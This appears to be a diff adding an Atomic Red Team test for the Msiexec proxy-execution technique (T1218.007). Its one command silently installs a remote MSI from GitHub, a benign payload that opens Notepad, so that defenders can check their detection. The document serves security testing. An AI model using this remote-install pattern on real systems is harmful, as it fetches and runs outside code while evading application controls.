@@ -1,0 +1,8 @@
+#TechniqueName: Signed Binary Proxy Execution: Msiexec
+#AtomicTestName: Msiexec.exe - Execute Remote MSI file
+#Description: Execute arbitrary MSI file retrieved remotely. Less commonly seen in application installation, commonly seen in malware execution. The MSI opens notepad.exe when sucessfully executed.&
+#Language: cmd
+
+#commands
+msiexec.exe /q /i "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.007/src/Win32/T1218.msi"
+
